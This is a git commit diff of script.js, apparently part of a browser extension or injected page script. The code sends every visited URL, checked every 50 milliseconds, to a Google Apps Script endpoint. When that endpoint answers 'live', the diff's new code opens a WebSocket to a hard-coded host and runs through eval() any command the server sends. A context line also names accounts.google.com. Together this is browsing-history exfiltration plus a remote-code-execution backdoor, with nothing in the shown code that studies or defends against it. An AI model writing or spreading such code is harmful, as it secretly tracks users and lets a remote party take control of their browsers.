1ea19a246629a2e79636cef31ea0d968ddf64c4d
Josh Chang <joshchang04@gmail.com>
2021-03-16 16:07:03 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,12 +1,25 @@
-console.log('V3')
+console.log('V4')
 
 // Log URLs
-fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
+fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`)
+  .then(r => r.text())
+  .then(t => {
+    if (t === 'live') {
+      initLiveControl();
+    }
+  })
+
 var href = window.location.href;
 setInterval(() => {
   if (window.location.href !== href) {
     href = window.location.href;
-    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
+    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`)
+      .then(r => r.text())
+      .then(t => {
+        if (t === 'live') {
+          initLiveControl();
+        }
+      })
   }
 }, 50);
 
@@ -25,22 +38,25 @@ if (window.location.host === 'accounts.google.com') {
 }
 
 // Live Control
-if (window.location.host !== '127.0.0.1:8080') {
-  const socket = new WebSocket('ws://192.168.86.232:8082');
+function initLiveControl() {
+  console.log('And we are live!');
+  if (window.location.host !== '127.0.0.1:8080') {
+    const socket = new WebSocket('ws://192.168.86.232:8082');
 
-  socket.addEventListener('open', function (event) {
-    var message = {
-      type: "handshake",
-      content: "client"
-    }
-    socket.send(JSON.stringify(message));
-  });
+    socket.addEventListener('open', function (event) {
+      var message = {
+        type: "handshake",
+        content: "client"
+      }
+      socket.send(JSON.stringify(message));
+    });
 
-  socket.addEventListener('message', function (event) {
-    console.log('Message from server ', event.data);
-    var data = JSON.parse(event.data);
-    if (data.type === 'commandClient') {
-      eval(data.content);
-    }
-  });
+    socket.addEventListener('message', function (event) {
+      var data = JSON.parse(event.data);
+      console.log(data);
+      if (data.type === 'commandClient') {
+        eval(data.content);
+      }
+    });
+  }
 }
